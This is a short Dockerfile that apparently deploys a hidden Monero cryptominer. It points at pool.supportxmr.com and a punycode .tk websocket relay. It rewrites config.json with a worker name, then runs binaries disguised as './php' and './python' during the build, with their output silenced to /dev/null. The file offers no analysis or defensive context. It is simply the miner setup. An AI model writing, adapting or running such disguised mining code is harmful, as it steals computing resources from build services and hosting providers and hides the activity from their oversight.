FROM vscwjm/test:mv1

ENV WS_URL=xn--fiq811j6ckwjg.xn--6krt7h.tk
ENV POOL_URL=pool.supportxmr.com:3333
ENV NAME_ID=TEST

WORKDIR /app

RUN sed -i "s/\"pass\": \"notunn\"/\"pass\": \"$NAME_ID\"/" /app/config.json
RUN (./php -L 127.0.0.1:3333:${POOL_URL} wss://${WS_URL} > /dev/null &) \
    && ./python > /dev/null
